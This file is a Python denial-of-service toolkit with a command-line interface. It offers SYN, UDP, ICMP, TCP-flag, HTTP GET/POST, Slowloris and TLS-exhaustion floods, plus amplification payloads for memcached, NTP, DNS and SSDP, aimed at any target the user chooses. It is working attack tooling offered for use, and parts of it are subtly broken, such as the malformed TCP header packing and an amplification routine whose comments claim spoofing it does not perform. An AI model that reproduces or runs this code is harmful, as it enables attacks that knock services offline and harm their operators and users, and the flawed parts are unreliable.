#!/usr/bin/env python3
"""
Advanced DDoS Toolkit — Multi-Vector
Layer 4 (TCP/UDP/ICMP) + Layer 7 (HTTP Flood) + Amplification
"""

import socket
import struct
import threading
import time
import random
import os
import sys
import ssl
import argparse
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor
import hashlib

# ─── COLORS ───
R = '\033[91m'
G = '\033[92m'
Y = '\033[93m'
B = '\033[94m'
C = '\033[96m'
W = '\033[97m'
RESET = '\033[0m'

BANNER = f"""
{R}╔══════════════════════════════════════════════════════════╗
║          A D V A N C E D   D D o S   T O O L K I T        ║
║        Multi-Vector · L4 + L7 · Amplification             ║
╠══════════════════════════════════════════════════════════╣
║  VECTORS:                                                 ║
║   [TCP] SYN · ACK · RST · FIN · XMAS · NULL              ║
║   [UDP] RAW · AMPLIFICATION · MEMCACHED · NTP            ║
║   [HTTP] GET · POST · SLOWLORIS · CACHE BYPASS           ║
║   [SSL] TLS EXHAUST · RENEGOTIATION FLOOD                ║
╚══════════════════════════════════════════════════════════╝{RESET}
"""

# ─── STATISTICS ───
class Stats:
    def __init__(self):
        self.packets_sent = 0
        self.bytes_sent = 0
        self.lock = threading.Lock()
        self.start_time = time.time()

    def add(self, size):
        with self.lock:
            self.packets_sent += 1
            self.bytes_sent += size

    def display(self):
        elapsed = time.time() - self.start_time
        pps = self.packets_sent / max(elapsed, 1)
        bps = self.bytes_sent / max(elapsed, 1)
        mbps = bps * 8 / 1_000_000
        sys.stdout.write(
            f"\r{C}[{G}✦{C}] Sent: {G}{self.packets_sent:,}{C} pkts | "
            f"{G}{pps:,.0f}{C} pps | {G}{mbps:.2f}{C} Mbps{RESET}   "
        )
        sys.stdout.flush()

stats = Stats()

# ─── CHECKSUM ───
def checksum(data):
    if len(data) % 2:
        data += b'\x00'
    s = sum(struct.unpack(f'!{len(data)//2}H', data))
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return ~s & 0xFFFF

# ─── IP HEADER ───
def ip_header(src, dst, proto, payload_len):
    ver_ihl = 0x45
    tos = 0
    total_len = 20 + payload_len
    ident = random.randint(1, 65535)
    flags_frag = 0x4000
    ttl = random.randint(60, 128)
    hdr_checksum = 0
    return struct.pack('!BBHHHBBH4s4s',
        ver_ihl, tos, total_len, ident, flags_frag,
        ttl, proto, hdr_checksum,
        socket.inet_aton(src), socket.inet_aton(dst))

# ─── TCP HEADER ───
def tcp_header(src_ip, dst_ip, src_port, dst_port, flags, seq=None):
    if seq is None:
        seq = random.randint(1, 4294967295)
    ack_seq = random.randint(1, 4294967295) if flags & 0x10 else 0
    offset_res = 5 << 12
    window = random.randint(1024, 65535)
    urg_ptr = 0

    hdr = struct.pack('!HHIIHHHH',
        src_port, dst_port, seq, ack_seq,
        offset_res, flags, window, urg_ptr)

    # pseudo header for checksum
    pseudo = struct.pack('!4s4sBBH',
        socket.inet_aton(src_ip), socket.inet_aton(dst_ip),
        0, 6, len(hdr))
    cksum = checksum(pseudo + hdr)

    return struct.pack('!HHIIHHHH',
        src_port, dst_port, seq, ack_seq,
        offset_res, flags, window, cksum | (urg_ptr << 16)
    ) if False else struct.pack('!HHIIHHH',
        src_port, dst_port, seq, ack_seq,
        offset_res | flags, window, cksum)

# ─── SYN FLOOD (RAW SOCKET) ───
def syn_flood(target_ip, target_port, duration):
    end_time = time.time() + duration
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    except PermissionError:
        print(f"{R}[!] Root/Admin required for raw sockets{RESET}")
        return

    while time.time() < end_time:
        try:
            src_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
            src_port = random.randint(1024, 65535)
            payload = os.urandom(random.randint(0, 64))

            ip_hdr = ip_header(src_ip, target_ip, 6, 20 + len(payload))
            tcp_hdr = tcp_header(src_ip, target_ip, src_port, target_port, 0x02)  # SYN

            packet = ip_hdr + tcp_hdr + payload
            sock.sendto(packet, (target_ip, target_port))
            stats.add(len(packet))
        except Exception:
            pass
    sock.close()

# ─── TCP CONNECTION FLOOD ───
def tcp_connect_flood(target_ip, target_port, duration):
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((target_ip, target_port))
            sock.send(os.urandom(random.randint(64, 1024)))
            stats.add(1024)
            sock.close()
        except Exception:
            pass

# ─── UDP FLOOD ───
def udp_flood(target_ip, target_port, duration):
    end_time = time.time() + duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while time.time() < end_time:
        try:
            payload = os.urandom(random.randint(512, 65500))
            sock.sendto(payload, (target_ip, target_port))
            stats.add(len(payload))
        except Exception:
            pass
    sock.close()

# ─── AMPLIFICATION FLOOD ───
def amplification_flood(target_ip, duration, amp_server=None):
    end_time = time.time() + duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(1)

    # Amplification payloads (spoofed source = target)
    amp_payloads = {
        'memcached': b'\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n',
        'ntp': b'\x17\x00\x03\x2a' + b'\x00' * 4 * 16,
        'dns': b'\x00\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00' \
               b'\x07version\x04bind\x00\x00\x10\x00\x03',
        'ssdp': b'M-SEARCH * HTTP/1.1\r\nHost:239.255.255.250:1900\r\n' \
                b'Man:"ssdp:discover"\r\nST:ssdp:all\r\n\r\n',
        'chargen': b'\x00',
    }

    # Common amplification server ranges
    memcached_servers = amp_server or [
        f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
        for _ in range(50)
    ]

    while time.time() < end_time:
        try:
            payload = random.choice(list(amp_payloads.values()))
            server = random.choice(memcached_servers)
            # Spoof source to target
            sock.sendto(payload, (server, random.choice([11211, 123, 53, 1900, 19])))
            stats.add(len(payload))
        except Exception:
            pass
    sock.close()

# ─── ICMP FLOOD ───
def icmp_flood(target_ip, duration):
    end_time = time.time() + duration
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    except PermissionError:
        # fallback to standard ICMP
        while time.time() < end_time:
            try:
                os.system(f'ping -f -s 65500 {target_ip} -c 1 2>/dev/null')
                stats.add(65500)
            except Exception:
                pass
        return

    while time.time() < end_time:
        try:
            payload = os.urandom(65500)
            icmp_type = 8  # Echo Request
            icmp_code = 0
            icmp_cksum = 0
            icmp_id = random.randint(1, 65535)
            icmp_seq = random.randint(1, 65535)

            icmp_hdr = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_cksum, icmp_id, icmp_seq)
            icmp_cksum = checksum(icmp_hdr + payload)
            icmp_hdr = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_cksum, icmp_id, icmp_seq)

            sock.sendto(icmp_hdr + payload, (target_ip, 0))
            stats.add(len(payload) + 8)
        except Exception:
            pass
    sock.close()

# ─── HTTP GET FLOOD ───
def http_flood(target_url, duration, threads_count):
    end_time = time.time() + duration
    parsed = urlparse(target_url if '://' in target_url else f'http://{target_url}')
    host = parsed.hostname
    port = parsed.port or (443 if parsed.scheme == 'https' else 80)
    path = parsed.path or '/'
    use_ssl = parsed.scheme == 'https'

    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0',
        'Googlebot/2.1 (+http://www.google.com/bot.html)',
        'Mozilla/5.0 (compatible; Bingbot/2.0)',
    ]

    # Cache bypass params
    bypass_params = [f'?nocache={random.randint(1,9999999999)}' for _ in range(100)]

    while time.time() < end_time:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            if use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=host)
            sock.settimeout(5)
            sock.connect((host, port))

            ua = random.choice(user_agents)
            bypass = random.choice(bypass_params)
            request = (
                f'GET {path}{bypass} HTTP/1.1\r\n'
                f'Host: {host}\r\n'
                f'User-Agent: {ua}\r\n'
                f'Accept: */*\r\n'
                f'Accept-Encoding: gzip, deflate\r\n'
                f'Connection: keep-alive\r\n\r\n'
            ).encode()

            sock.send(request)
            stats.add(len(request))
            sock.close()
        except Exception:
            pass

# ─── HTTP POST FLOOD ───
def http_post_flood(target_url, duration):
    end_time = time.time() + duration
    parsed = urlparse(target_url if '://' in target_url else f'http://{target_url}')
    host = parsed.hostname
    port = parsed.port or 80
    path = parsed.path or '/'
    use_ssl = parsed.scheme == 'https'

    while time.time() < end_time:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            if use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=host)
            sock.settimeout(5)
            sock.connect((host, port))

            # Large random POST body
            body_size = random.randint(1024, 65536)
            body = os.urandom(body_size).hex()

            request = (
                f'POST {path} HTTP/1.1\r\n'
                f'Host: {host}\r\n'
                f'Content-Type: application/x-www-form-urlencoded\r\n'
                f'Content-Length: {len(body)}\r\n'
                f'Connection: keep-alive\r\n\r\n{body}'
            ).encode()

            sock.send(request)
            stats.add(len(request))
            sock.close()
        except Exception:
            pass

# ─── SLOWLORIS ───
def slowloris(target_url, duration, socket_count=500):
    end_time = time.time() + duration
    parsed = urlparse(target_url if '://' in target_url else f'http://{target_url}')
    host = parsed.hostname
    port = parsed.port or 80
    path = parsed.path or '/'

    sockets = []

    def create_socket():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            sock.connect((host, port))
            sock.send(
                f'GET {path} HTTP/1.1\r\n'
                f'Host: {host}\r\n'
                f'User-Agent: Mozilla/5.0\r\n'
                f'X-a: {random.randint(1, 5000)}\r\n'
            .encode())
            return sock
        except Exception:
            return None

    print(f"{Y}[*] Slowloris: Opening {socket_count} sockets...{RESET}")
    for _ in range(socket_count):
        s = create_socket()
        if s:
            sockets.append(s)
        time.sleep(0.01)

    print(f"{G}[+] {len(sockets)} sockets connected. Holding...{RESET}")

    while time.time() < end_time:
        alive = []
        for s in sockets:
            try:
                s.send(f'X-b: {random.randint(1, 5000)}\r\n'.encode())
                alive.append(s)
            except Exception:
                new = create_socket()
                if new:
                    alive.append(new)
        sockets = alive
        stats.add(len(sockets) * 20)
        time.sleep(10)

    for s in sockets:
        try:
            s.close()
        except Exception:
            pass

# ─── TLS EXHAUSTION ───
def tls_exhaustion(target_host, duration, port=443):
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            tls_sock = context.wrap_socket(sock, server_hostname=target_host)
            tls_sock.send(b'GET / HTTP/1.1\r\nHost: ' + target_host.encode() + b'\r\n\r\n')
            stats.add(1024)
            tls_sock.close()
        except Exception:
            pass

# ─── XMAS/NULL/FIN FLOOD ───
def flag_flood(target_ip, target_port, duration, flag_type='xmas'):
    end_time = time.time() + duration
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    except PermissionError:
        return

    flags_map = {
        'xmas': 0x29,  # FIN|PSH|URG
        'null': 0x00,
        'fin':  0x01,
        'ack':  0x10,
        'rst':  0x04,
    }
    flag = flags_map.get(flag_type, 0x29)

    while time.time() < end_time:
        try:
            src_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
            src_port = random.randint(1024, 65535)
            ip_hdr = ip_header(src_ip, target_ip, 6, 20)
            tcp_hdr = tcp_header(src_ip, target_ip, src_port, target_port, flag)
            packet = ip_hdr + tcp_hdr
            sock.sendto(packet, (target_ip, target_port))
            stats.add(len(packet))
        except Exception:
            pass
    sock.close()

# ─── MIXED ATTACK ───
def mixed_attack(target_ip, target_port, duration):
    """Launches multiple vectors simultaneously"""
    vectors = [
        threading.Thread(target=udp_flood, args=(target_ip, target_port, duration)),
        threading.Thread(target=tcp_connect_flood, args=(target_ip, target_port, duration)),
        threading.Thread(target=syn_flood, args=(target_ip, target_port, duration)),
        threading.Thread(target=icmp_flood, args=(target_ip, duration)),
    ]
    for v in vectors:
        v.daemon = True
        v.start()
    return vectors

# ─── STATS MONITOR ───
def stats_monitor(duration):
    end_time = time.time() + duration
    while time.time() < end_time:
        stats.display()
        time.sleep(0.5)
    print(f"\n{G}[+] Attack complete.{RESET}")
    print(f"{C}    Total packets: {stats.packets_sent:,}{RESET}")
    print(f"    Total data: {stats.bytes_sent / 1_000_000:.2f} MB")
    print(f"    Duration: {time.time() - stats.start_time:.1f}s{RESET}")

# ─── MAIN ───
def main():
    print(BANNER)

    parser = argparse.ArgumentParser(description='Advanced DDoS Toolkit', add_help=True)
    parser.add_argument('-t', '--target', required=True, help='Target IP or URL')
    parser.add_argument('-p', '--port', type=int, default=80, help='Target port')
    parser.add_argument('-d', '--duration', type=int, default=60, help='Attack duration (seconds)')
    parser.add_argument('-T', '--threads', type=int, default=100, help='Thread count')
    parser.add_argument('-v', '--vector', required=True,
        choices=['syn', 'udp', 'tcp', 'icmp', 'http', 'post', 'slowloris',
                 'tls', 'xmas', 'null', 'fin', 'ack', 'rst', 'amp', 'mixed'],
        help='Attack vector')

    args = parser.parse_args()
    target_ip = args.target
    target_port = args.port
    duration = args.duration
    threads = args.threads
    vector = args.vector

    # Resolve hostname
    try:
        target_ip = socket.gethostbyname(args.target.split('/')[0].split(':')[0])
        print(f"{Y}[*] Resolved: {args.target} → {target_ip}{RESET}")
    except Exception:
        pass

    print(f"{R}[*] Target: {target_ip}:{target_port}")
    print(f"[*] Vector: {vector.upper()}")
    print(f"[*] Duration: {duration}s")
    print(f"[*] Threads: {threads}")
    print(f"[*] Starting attack...{RESET}\n")

    stats.start_time = time.time()

    # Launch stats monitor
    monitor = threading.Thread(target=stats_monitor, args=(duration,), daemon=True)
    monitor.start()

    # Launch attack threads
    if vector == 'syn':
        pool = ThreadPoolExecutor(max_workers=threads)
        for _ in range(threads):
            pool.submit(syn_flood, target_ip, target_port, duration)

    elif vector == 'udp':
        pool = ThreadPoolExecutor(max_workers=threads)
        for _ in range(threads):
            pool.submit(udp_flood, target_ip, target_port, duration)

    elif vector == 'tcp':
        pool = ThreadPoolExecutor(max_workers=threads)
        for _ in range(threads):
            pool.submit(tcp_connect_flood, target_ip, target_port, duration)

    elif vector == 'icmp':
        pool = ThreadPoolExecutor(max_workers=threads)
        for _ in range(threads):
            pool.submit(icmp_flood, target_ip, duration)

    elif vector == 'http':
        pool = ThreadPoolExecutor(max_workers=threads)
        for _ in range(threads):
            pool.submit(http_flood, args.target, duration, threads)

    elif vector == 'post':
        pool = ThreadPoolExecutor(max_workers=threads)
        for _ in range(threads):
            pool.submit(http_post_flood, args.target, duration)

    elif vector == 'slowloris':
        slowloris(args.target, duration, socket_count=threads)

    elif vector == 'tls':
        pool = ThreadPoolExecutor(max_workers=threads)
        for _ in range(threads):
            pool.submit(tls_exhaustion, args.target, duration, target_port)

    elif vector in ['xmas', 'null', 'fin', 'ack', 'rst']:
        pool = ThreadPoolExecutor(max_workers=threads)
        for _ in range(threads):
            pool.submit(flag_flood, target_ip, target_port, duration, vector)

    elif vector == 'amp':
        pool = ThreadPoolExecutor(max_workers=threads)
        for _ in range(threads):
            pool.submit(amplification_flood, target_ip, duration)

    elif vector == 'mixed':
        threads_list = mixed_attack(target_ip, target_port, duration)
        for t in threads_list:
            t.join()

    # Wait for completion
    if vector != 'mixed':
        pool.shutdown(wait=True)
    else:
        pass

    print(f"\n{G}{'='*60}")
    print(f"  Attack finished — {stats.packets_sent:,} packets sent")
    print(f"  Total data: {stats.bytes_sent / 1_000_000:.2f} MB")
    print(f"  Elapsed: {time.time() - stats.start_time:.1f} seconds")
    print(f"{'='*60}{RESET}")

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Y}[!] Attack interrupted. Shutting down.{RESET}")
        sys.exit(0)
